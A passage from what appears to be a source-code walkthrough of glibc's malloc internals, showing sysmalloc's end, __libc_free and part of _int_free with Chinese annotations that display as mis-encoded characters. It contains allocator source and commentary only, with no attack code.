<br>        &#123;  <br>          <span class="hljs-comment">/* Call the `morecore&#x27; hook if necessary.  */</span>  <br>          <span class="hljs-type">void</span> (*hook) (<span class="hljs-type">void</span>) = atomic_forced_read (__after_morecore_hook);  <br>          <span class="hljs-keyword">if</span> (__builtin_expect (hook != <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>))  <br>            (*hook)();  <br>        &#125;  <br>      <span class="hljs-keyword">else</span>  <br>        &#123;  <br>          <span class="hljs-comment">/*  </span><br><span class="hljs-comment">             If have mmap, try using it as a backup when MORECORE fails or             cannot be used. This is worth doing on systems that have &quot;holes&quot; in             address space, so sbrk cannot extend to give contiguous space, but             space is available elsewhere.  Note that we ignore mmap max count             and threshold limits, since the space will not be used as a             segregated mmap region.           */</span>  <br>          <span class="hljs-comment">/* Cannot merge with old top, so add its size back in */</span>          <span class="hljs-keyword">if</span> (contiguous (av))  <br>            size = ALIGN_UP (size + old_size, pagesize);  <br>  <br>          <span class="hljs-comment">/* If we are relying on mmap as backup, then use larger units */</span>  <br>          <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &lt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (MMAP_AS_MORECORE_SIZE))  <br>            size = MMAP_AS_MORECORE_SIZE;  <br>  <br>          <span class="hljs-comment">/* Don&#x27;t try if size wraps around 0 */</span>  <br>          <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &gt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb))  <br>            &#123;  <br>              <span class="hljs-type">char</span> *mbrk = (<span class="hljs-type">char</span> *) (MMAP (<span class="hljs-number">0</span>, size, PROT_READ | PROT_WRITE, <span class="hljs-number">0</span>));  <br>  <br>              <span class="hljs-keyword">if</span> (mbrk != MAP_FAILED)  <br>                &#123;  <br>                  <span class="hljs-comment">/* We do not need, and cannot use, another sbrk call to find end */</span>  <br>                  brk = mbrk;  <br>                  snd_brk = brk + size;  <br>  <br>                  <span class="hljs-comment">/*  </span><br><span class="hljs-comment">                     Record that we no longer have a contiguous sbrk region.                     After the first time mmap is used as backup, we do not                     ever rely on contiguous space since this could incorrectly                     bridge regions.                   */</span>                  set_noncontiguous (av);  <br>                &#125;  <br>            &#125;  <br>        &#125;  <br>  <br>      <span class="hljs-keyword">if</span> (brk != (<span class="hljs-type">char</span> *) (MORECORE_FAILURE))  <br>        &#123;  <br>          <span class="hljs-keyword">if</span> (mp_.sbrk_base == <span class="hljs-number">0</span>)  <br>            mp_.sbrk_base = brk;  <br>          av-&gt;system_mem += size;  <br>  <br>          <span class="hljs-comment">/*  </span><br><span class="hljs-comment">             If MORECORE extends previous space, we can likewise extend top size.           */</span>  <br>          <span class="hljs-keyword">if</span> (brk == old_end &amp;&amp; snd_brk == (<span class="hljs-type">char</span> *) (MORECORE_FAILURE))  <br>            set_head (old_top, (size + old_size) | PREV_INUSE);  <br>  <br>          <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (contiguous (av) &amp;&amp; old_size &amp;&amp; brk &lt; old_end)  <br>            &#123;  <br>              <span class="hljs-comment">/* Oops!  Someone else killed our space..  Can&#x27;t touch anything.  */</span>  <br>              malloc_printerr (<span class="hljs-number">3</span>, <span class="hljs-string">&quot;break adjusted to free malloc space&quot;</span>, brk,  <br>           av);  <br>            &#125;  <br>  <br>          <span class="hljs-comment">/*  </span><br><span class="hljs-comment">             Otherwise, make adjustments:  </span><br><span class="hljs-comment">           * If the first time through or noncontiguous, we need to call sbrk              just to find out where the end of memory lies.  </span><br><span class="hljs-comment">           * We need to ensure that all returned chunks from malloc will meet              MALLOC_ALIGNMENT  </span><br><span class="hljs-comment">           * If there was an intervening foreign sbrk, we need to adjust sbrk              request size to account for fact that we will not be able to              combine new space with existing space in old_top.  </span><br><span class="hljs-comment">           * Almost all systems internally allocate whole pages at a time, in              which case we might as well use the whole last page of request.              So we allocate enough more memory to hit a page boundary now,              which in turn causes future contiguous calls to page-align.           */</span>  <br>          <span class="hljs-keyword">else</span>  <br>            &#123;  <br>              front_misalign = <span class="hljs-number">0</span>;  <br>              end_misalign = <span class="hljs-number">0</span>;  <br>              correction = <span class="hljs-number">0</span>;  <br>              aligned_brk = brk;  <br>  <br>              <span class="hljs-comment">/* handle contiguous cases */</span>  <br>              <span class="hljs-keyword">if</span> (contiguous (av))  <br>                &#123;  <br>                  <span class="hljs-comment">/* Count foreign sbrk as system_mem.  */</span>  <br>                  <span class="hljs-keyword">if</span> (old_size)  <br>                    av-&gt;system_mem += brk - old_end;  <br>  <br>                  <span class="hljs-comment">/* Guarantee alignment of first new chunk made from this space */</span>  <br>  <br>                  front_misalign = (INTERNAL_SIZE_T) chunk2mem (brk) &amp; MALLOC_ALIGN_MASK;  <br>                  <span class="hljs-keyword">if</span> (front_misalign &gt; <span class="hljs-number">0</span>)  <br>                    &#123;  <br>                      <span class="hljs-comment">/*  </span><br><span class="hljs-comment">                         Skip over some bytes to arrive at an aligned position.                         We don&#x27;t need to specially mark these wasted front bytes.                         They will never be accessed anyway because                         prev_inuse of av-&gt;top (and any chunk created from its start)                         is always true after initialization.                       */</span>  <br>                      correction = MALLOC_ALIGNMENT - front_misalign;  <br>                      aligned_brk += correction;  <br>                    &#125;  <br>  <br>                  <span class="hljs-comment">/*  </span><br><span class="hljs-comment">                     If this isn&#x27;t adjacent to existing space, then we will not                     be able to merge with old_top space, so must add to 2nd request.                   */</span>  <br>                  correction += old_size;  <br>  <br>                  <span class="hljs-comment">/* Extend the end address to hit a page boundary */</span>  <br>                  end_misalign = (INTERNAL_SIZE_T) (brk + size + correction);  <br>                  correction += (ALIGN_UP (end_misalign, pagesize)) - end_misalign;  <br>  <br>                  assert (correction &gt;= <span class="hljs-number">0</span>);  <br>                  snd_brk = (<span class="hljs-type">char</span> *) (MORECORE (correction));  <br>  <br>                  <span class="hljs-comment">/*  </span><br><span class="hljs-comment">                     If can&#x27;t allocate correction, try to at least find out current                     brk.  It might be enough to proceed without failing.  </span><br><span class="hljs-comment">                     Note that if second sbrk did NOT fail, we assume that space                     is contiguous with first sbrk. This is a safe assumption unless                     program is multithreaded but doesn&#x27;t use locks and a foreign sbrk                     occurred between our first and second calls.                   */</span>  <br>                  <span class="hljs-keyword">if</span> (snd_brk == (<span class="hljs-type">char</span> *) (MORECORE_FAILURE))  <br>                    &#123;  <br>                      correction = <span class="hljs-number">0</span>;  <br>                      snd_brk = (<span class="hljs-type">char</span> *) (MORECORE (<span class="hljs-number">0</span>));  <br>                    &#125;  <br>                  <span class="hljs-keyword">else</span>  <br>                    &#123;  <br>                      <span class="hljs-comment">/* Call the `morecore&#x27; hook if necessary.  */</span>  <br>                      <span class="hljs-type">void</span> (*hook) (<span class="hljs-type">void</span>) = atomic_forced_read (__after_morecore_hook);  <br>                      <span class="hljs-keyword">if</span> (__builtin_expect (hook != <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>))  <br>                        (*hook)();  <br>                    &#125;  <br>                &#125;  <br>  <br>              <span class="hljs-comment">/* handle non-contiguous cases */</span>  <br>              <span class="hljs-keyword">else</span>  <br>                &#123;  <br>                  <span class="hljs-keyword">if</span> (MALLOC_ALIGNMENT == <span class="hljs-number">2</span> * SIZE_SZ)  <br>                    <span class="hljs-comment">/* MORECORE/mmap must correctly align */</span>  <br>                    assert (((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) chunk2mem (brk) &amp; MALLOC_ALIGN_MASK) == <span class="hljs-number">0</span>);  <br>                  <span class="hljs-keyword">else</span>  <br>                    &#123;  <br>                      front_misalign = (INTERNAL_SIZE_T) chunk2mem (brk) &amp; MALLOC_ALIGN_MASK;  <br>                      <span class="hljs-keyword">if</span> (front_misalign &gt; <span class="hljs-number">0</span>)  <br>                        &#123;  <br>                          <span class="hljs-comment">/*  </span><br><span class="hljs-comment">                             Skip over some bytes to arrive at an aligned position.                             We don&#x27;t need to specially mark these wasted front bytes.                             They will never be accessed anyway because                             prev_inuse of av-&gt;top (and any chunk created from its start)                             is always true after initialization.                           */</span>  <br>                          aligned_brk += MALLOC_ALIGNMENT - front_misalign;  <br>                        &#125;  <br>                    &#125;  <br>  <br>                  <span class="hljs-comment">/* Find out current end of memory */</span>  <br>                  <span class="hljs-keyword">if</span> (snd_brk == (<span class="hljs-type">char</span> *) (MORECORE_FAILURE))  <br>                    &#123;  <br>                      snd_brk = (<span class="hljs-type">char</span> *) (MORECORE (<span class="hljs-number">0</span>));  <br>                    &#125;  <br>                &#125;  <br>  <br>              <span class="hljs-comment">/* Adjust top based on results of second sbrk */</span>  <br>              <span class="hljs-keyword">if</span> (snd_brk != (<span class="hljs-type">char</span> *) (MORECORE_FAILURE))  <br>                &#123;  <br>                  av-&gt;top = (mchunkptr) aligned_brk;  <br>                  set_head (av-&gt;top, (snd_brk - aligned_brk + correction) | PREV_INUSE);  <br>                  av-&gt;system_mem += correction;  <br>  <br>                  <span class="hljs-comment">/*  </span><br><span class="hljs-comment">                     If not the first time through, we either have a                     gap due to foreign sbrk or a non-contiguous region.  Insert a                     double fencepost at old_top to prevent consolidation with space                     we don&#x27;t own. These fenceposts are artificial chunks that are                     marked as inuse and are in any case too small to use.  We need                     two to make sizes and alignments work out.                   */</span>  <br>                  <span class="hljs-keyword">if</span> (old_size != <span class="hljs-number">0</span>)  <br>                    &#123;  <br>                      <span class="hljs-comment">/*  </span><br><span class="hljs-comment">                         Shrink old_top to insert fenceposts, keeping size a                         multiple of MALLOC_ALIGNMENT. We know there is at least                         enough space in old_top to do this.                       */</span>                      old_size = (old_size - <span class="hljs-number">4</span> * SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK;  <br>                      set_head (old_top, old_size | PREV_INUSE);  <br>  <br>                      <span class="hljs-comment">/*  </span><br><span class="hljs-comment">                         Note that the following assignments completely overwrite                         old_top when old_size was previously MINSIZE.  This is                         intentional. We need the fencepost, even if old_top otherwise gets                         lost.                       */</span>                      chunk_at_offset (old_top, old_size)-&gt;size =  <br>                        (<span class="hljs-number">2</span> * SIZE_SZ) | PREV_INUSE;  <br>  <br>                      chunk_at_offset (old_top, old_size + <span class="hljs-number">2</span> * SIZE_SZ)-&gt;size =  <br>                        (<span class="hljs-number">2</span> * SIZE_SZ) | PREV_INUSE;  <br>  <br>                      <span class="hljs-comment">/* If possible, release the rest. */</span>  <br>                      <span class="hljs-keyword">if</span> (old_size &gt;= MINSIZE)  <br>                        &#123;  <br>                          _int_free (av, old_top, <span class="hljs-number">1</span>);  <br>                        &#125;  <br>                    &#125;  <br>                &#125;  <br>            &#125;  <br>        &#125;  <br>    &#125; <span class="hljs-comment">/* if (av !=  &amp;main_arena) */</span>  <br>  <br>  <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) av-&gt;system_mem &gt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (av-&gt;max_system_mem))  <br>    av-&gt;max_system_mem = av-&gt;system_mem;  <br>  check_malloc_state (av);  <br>  <br>  <span class="hljs-comment">/* finally, do the allocation */</span>  <br>  p = av-&gt;top;  <br>  size = chunksize (p);  <br>  <br>  <span class="hljs-comment">/* check that one of the above allocation paths succeeded */</span>  <br>  <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &gt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb + MINSIZE))  <br>    &#123;  <br>      remainder_size = size - nb;  <br>      remainder = chunk_at_offset (p, nb);  <br>      av-&gt;top = remainder;  <br>      set_head (p, nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));  <br>      set_head (remainder, remainder_size | PREV_INUSE);  <br>      check_malloced_chunk (av, p, nb);  <br>      <span class="hljs-keyword">return</span> chunk2mem (p);  <br>    &#125;  <br>  <br>  <span class="hljs-comment">/* catch all failure paths */</span>  <br>  __set_errno (ENOMEM);  <br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="é‡Šæ”¾è¿‡ç¨‹"><a href="#é‡Šæ”¾è¿‡ç¨‹" class="headerlink" title="é‡Šæ”¾è¿‡ç¨‹"></a>é‡Šæ”¾è¿‡ç¨‹</h2><h2 id="freeæºç åˆ†æ"><a href="#freeæºç åˆ†æ" class="headerlink" title="freeæºç åˆ†æ"></a>freeæºç åˆ†æ</h2><h3 id="libc-free"><a href="#libc-free" class="headerlink" title="__libc_free"></a><code>__libc_free</code></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span><br>__libc_free (<span class="hljs-type">void</span> *mem)<br>&#123;<br>  mstate ar_ptr;<br>  mchunkptr p;                          <span class="hljs-comment">/* chunk corresponding to mem */</span><br>  <span class="hljs-comment">// è°ƒç”¨ __free_hook ï¼Œå‚æ•°æ˜¯æ˜¯å¦çš„å†…å­˜çš„åœ°å€ã€‚</span><br>  <span class="hljs-type">void</span> (*hook) (<span class="hljs-type">void</span> *, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *)<br>    = atomic_forced_read (__free_hook);<br>  <span class="hljs-keyword">if</span> (__builtin_expect (hook != <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>))<br>    &#123;<br>      (*hook)(mem, RETURN_ADDRESS (<span class="hljs-number">0</span>));<br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br> <br>  <span class="hljs-keyword">if</span> (mem == <span class="hljs-number">0</span>)                              <span class="hljs-comment">/* free(0) has no effect */</span><br>    <span class="hljs-keyword">return</span>;<br> <br>  p = mem2chunk (mem);<br>  <span class="hljs-comment">// å¦‚æœæ˜¯ mmapp å¾—åˆ°çš„å†…å­˜å•ç‹¬å¤„ç†</span><br>  <span class="hljs-keyword">if</span> (chunk_is_mmapped (p))                       <span class="hljs-comment">/* release mmapped memory. */</span><br>    &#123;<br>      <span class="hljs-comment">/* see if the dynamic brk/mmap threshold needs adjusting */</span><br>      <span class="hljs-comment">// é‡Šæ”¾çš„å†…å­˜å¤§å°å¦‚æœå¤§äº mmap_threshold å¹¶ä¸”å°äº DEFAULT_MMAP_THRESHOLD_MAX(0x20000)</span><br>      <span class="hljs-comment">// åˆ™æ›´æ–° mmap_threshold ä¸ºé‡Šæ”¾å†…å­˜çš„å¤§å°ï¼Œtrim_threshold ä¸ºä¸¤å€é‡Šæ”¾å†…å­˜çš„å¤§å°ã€‚</span><br>      <span class="hljs-comment">// å…¶ä¸­ mmap_threshold æ˜¯ sysmalloc ä¸­ brk å’Œ mmap ä¸¤ç§ç³»ç»Ÿè°ƒç”¨è·å–å†…å­˜çš„é€‰æ‹©çš„è¾¹ç•Œå€¼</span><br>      <span class="hljs-comment">// trim_threshold ä¸ºæ˜¯å¦ systrim å‡å°‘ ptmalloc ä¿ç•™å†…å­˜çš„å‚è€ƒå€¼</span><br>      <span class="hljs-keyword">if</span> (!mp_.no_dyn_threshold<br>          &amp;&amp; p-&gt;size &gt; mp_.mmap_threshold<br>          &amp;&amp; p-&gt;size &lt;= DEFAULT_MMAP_THRESHOLD_MAX)<br>        &#123;<br>          mp_.mmap_threshold = chunksize (p);<br>          mp_.trim_threshold = <span class="hljs-number">2</span> * mp_.mmap_threshold;<br>          LIBC_PROBE (memory_mallopt_free_dyn_thresholds, <span class="hljs-number">2</span>,<br>                      mp_.mmap_threshold, mp_.trim_threshold);<br>        &#125;<br>      <span class="hljs-comment">// è°ƒç”¨ nummap é‡Šæ”¾å†…å­˜</span><br>      munmap_chunk (p);<br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br> <br>  <span class="hljs-comment">// è°ƒç”¨ _int_free é‡Šæ”¾å†…å­˜</span><br>  ar_ptr = arena_for_chunk (p);<br>  _int_free (ar_ptr, p, <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="int-free"><a href="#int-free" class="headerlink" title="_int_free"></a><code>_int_free</code></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> _int_free (mstate av, mchunkptr p, <span class="hljs-type">int</span> have_lock) &#123;<br>  INTERNAL_SIZE_T size;        <span class="hljs-comment">/* é‡Šæ”¾çš„chunkçš„size */</span><br>  mfastbinptr *fb;             <span class="hljs-comment">/* å¯¹åº”çš„fastbin */</span><br>  mchunkptr nextchunk;         <span class="hljs-comment">/* å†…å­˜ç©ºé—´ä¸­ä¸‹ä¸€ä¸ªchunk */</span><br>  INTERNAL_SIZE_T nextsize;    <span class="hljs-comment">/* ä¸‹ä¸€ä¸ªchunkçš„å¤§å° */</span><br>  <span class="hljs-type">int</span> nextinuse;               <span class="hljs-comment">/* ä¸‹ä¸€ä¸ªchunkæ˜¯å¦åœ¨ä½¿ç”¨ */</span><br>  INTERNAL_SIZE_T prevsize;    <span class="hljs-comment">/* å†…å­˜ç©ºé—´ä¸­ä¸Šä¸€ä¸ªchunk */</span><br>  mchunkptr bck;               <span class="hljs-comment">/* ç”¨äºå‚¨å­˜biné“¾è¡¨æŒ‡é’ˆ */</span><br>  mchunkptr fwd;               <span class="hljs-comment">/* ç”¨äºå‚¨å­˜biné“¾è¡¨æŒ‡é’ˆ */</span><br> <br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *errstr = <span class="hljs-literal">NULL</span>;<br>  <span class="hljs-type">int</span> locked = <span class="hljs-number">0</span>;<br>  size = chunksize (p);<br>  <span class="hljs-keyword">if</span> (__builtin_expect ((<span class="hljs-type">uintptr_t</span>) p &gt; (<span class="hljs-type">uintptr_t</span>) -size, <span class="hljs-number">0</span>) || __builtin_expect (misaligned_chunk (p), <span class="hljs-number">0</span>)) &#123;<br>    <span class="hljs-comment">//chunkçš„æŒ‡é’ˆåœ°å€ä¸èƒ½æº¢å‡º</span><br>    errstr = <span class="hljs-string">&quot;free(): invalid pointer&quot;</span>;<br>  errout:<br>    <span class="hljs-keyword">if</span> (!have_lock &amp;&amp; locked)<br>      (<span class="hljs-type">void</span>) mutex_unlock (&amp;av-&gt;mutex);<br>    malloc_printerr (check_action, errstr, chunk2mem (p), av);<br>    <span class="hljs-keyword">return</span>;<br>  &#125;<br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size))) &#123;<br>    <span class="hljs-comment">//chunkçš„å¤§å°å¿…é¡»å¤§äºç­‰äºMINSIZEä¸”å¯¹é½</span><br>    errstr = <span class="hljs-string">&quot;free(): invalid size&quot;</span>;<br>    <span class="hljs-keyword">goto</span> errout;<br>  &#125;<br>  check_inuse_chunk(av, p);<br>  <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(size) &lt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(get_max_fast ())<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> TRIM_FASTBINS</span><br>      &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top)<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>  ) &#123;<br>    <span class="hljs-comment">//å½“å‰freeçš„chunkå±äºfastbin</span><br>    <span class="hljs-keyword">if</span> (__builtin_expect (chunk_at_offset (p, size)-&gt;size &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>) || __builtin_expect (chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem, <span class="hljs-number">0</span>)) &#123;<br>      <span class="hljs-comment">//æŸ¥çœ‹ä¸‹ä¸€ä¸ªç›¸é‚»çš„chunkçš„å¤§å°æ˜¯å¦å°äºç­‰äº2 * SIZE_SZ,æˆ–æ˜¯å¦å¤§äºåˆ†é…åŒºæ‰€åˆ†é…çš„å†…å­˜æ€»é‡</span><br>        <span class="hljs-keyword">if</span> (have_lock || (&#123; assert (locked == <span class="hljs-number">0</span>); mutex_lock(&amp;av-&gt;mutex); locked = <span class="hljs-number">1</span>; chunk_at_offset (p, size)-&gt;size &lt;= <span class="hljs-number">2</span> * SIZE_SZ || chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem; &#125;)) &#123;<br>          errstr = <span class="hljs-string">&quot;free(): invalid next size (fast)&quot;</span>;<br>          <span class="hljs-keyword">goto</span> errout;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (! have_lock) &#123;<br>          (<span class="hljs-type">void</span>)mutex_unlock(&amp;av-&gt;mutex);<br>          locked = <span class="hljs-number">0</span>;<br>        &#125;<br>        <span class="hljs-comment">//è¯»å–åˆ†é…åŒºæ‰€åˆ†é…çš„å†…å­˜æ€»é‡éœ€è¦å¯¹åˆ†é…åŒºåŠ é”,æ£€æŸ¥å®Œä»¥å,é‡Šæ”¾åˆ†é…åŒºçš„é”</span><br>    &#125;<br>    free_perturb (chunk2mem(p), size - <span class="hljs-number">2</span> * SIZE_SZ);<br> <br>    set_fastchunks(av);<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> idx = fastbin_index(size);<br>    fb = &amp;fastbin (av, idx);<br>    <span class="hljs-comment">//è®¾ç½®å½“å‰åˆ†é…åŒºçš„fastbinçš„flag,è¡¨ç¤ºå½“å‰åˆ†é…åŒºçš„fastbinä¸­å·²æœ‰ç©ºé—²chunk.ç„¶åæ ¹æ®å½“å‰freeçš„chunkå¤§å°è·å–æ‰€å±çš„fastbin</span><br>    mchunkptr old = *fb, old2;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> old_idx = ~<span class="hljs-number">0u</span>;<br>    <span class="hljs-keyword">do</span> &#123;<br>        <span class="hljs-keyword">if</span> (__builtin_expect (old == p, <span class="hljs-number">0</span>)) &#123;<br>        <span class="hljs-comment">//fastbin double freeæ£€æµ‹</span><br>          errstr = <span class="hljs-string">&quot;double free or corruption (fasttop)&quot;</span>;<br>          <span class="hljs-keyword">goto</span> errout;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (have_lock &amp;&amp; old != <span class="hljs-literal">NULL</span>)<br>          old_idx = fastbin_index(chunksize(old));<br>        p-&gt;fd = old2 = old;<br>    &#125; <span class="hljs-keyword">while</span> ((old = catomic_compare_and_exchange_val_rel (fb, p, old2)) != old2);<br>    <span class="hljs-comment">//ä½¿ç”¨lock-freeæŠ€æœ¯å®ç°fastbinçš„å•å‘é“¾è¡¨æ’å…¥æ“ä½œ</span><br>    <span class="hljs-keyword">if</span> (have_lock &amp;&amp; old != <span class="hljs-literal">NULL</span> &amp;&amp; __builtin_expect (old_idx != idx, <span class="hljs-number">0</span>)) &#123;<br>        errstr = <span class="hljs-string">&quot;invalid fastbin entry (free)&quot;</span>;<br>        <span class="hljs-keyword">goto</span> errout;<br>    &#125;<br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!chunk_is_mmapped(p)) &#123;<br>    <span class="hljs-comment">//å½“å‰freeçš„chunkä¸æ˜¯é€šè¿‡mmapåˆ†é…çš„,å¹¶ä¸”å½“å‰è¿˜æ²¡æœ‰è·å¾—åˆ†é…åŒºçš„é”,è·å–åˆ†é…åŒºçš„é”</span><br>    <span class="hljs-keyword">if</span> (! have_lock) &#123;<br>      (<span class="hljs-type">void</span>)mutex_lock(&amp;av-&gt;mutex);<br>      locked = <span class="hljs-number">1</span>;<br>    &#125;<br>    nextchunk = chunk_at_offset(p, size);<br> <br>    <span class="hljs-keyword">if</span> (__glibc_unlikely (p == av-&gt;top)) &#123;<br>      <span class="hljs-comment">//freeçš„æ˜¯top chunk</span><br>        errstr = <span class="hljs-string">&quot;double free or corruption (top)&quot;</span>;<br>        <span class="hljs-keyword">goto</span> errout;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (__builtin_expect (contiguous (av) &amp;&amp; (<span class="hljs-type">char</span> *) nextchunk &gt;= ((<span class="hljs-type">char</span> *) av-&gt;top + chunksize(av-&gt;top)), <span class="hljs-number">0</span>)) &#123;<br>      <span class="hljs-comment">//å†…å­˜ä¸­ä¸‹ä¸€ä¸ªchunkçš„åœ°å€å¤§äºtop chunkçš„æœ«å°¾</span><br>        errstr = <span class="hljs-string">&quot;double free or corruption (out)&quot;</span>;<br>        <span class="hljs-keyword">goto</span> errout;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (__glibc_unlikely (!prev_inuse(nextchunk))) &#123;<br>      <span class="hljs-comment">//è¯¥chunkå·²ç»æ˜¯freeçŠ¶æ€</span><br>        errstr = <span class="hljs-string">&quot;double free or corruption (!prev)&quot;</span>;<br>        <span class="hljs-keyword">goto</span> errout;<br>    &#125;<br> <br>    nextsize = chunksize(nextchunk);<br>    <span class="hljs-keyword">if</span> (__builtin_expect (nextchunk-&gt;size &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>) || __builtin_expect (nextsize &gt;= av-&gt;system_mem, <span 